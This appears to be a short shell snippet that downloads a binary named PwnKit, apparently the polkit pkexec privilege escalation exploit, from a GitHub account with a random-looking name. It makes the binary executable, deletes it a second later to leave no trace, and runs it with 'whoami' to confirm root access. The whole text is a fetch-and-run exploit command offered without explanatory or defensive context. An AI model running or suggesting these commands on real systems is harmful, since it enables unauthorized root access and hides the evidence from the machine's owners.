curl -fsSL https://raw.githubusercontent.com/gORBKWnKRDBOKESCUJFCNP/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit 'whoami'
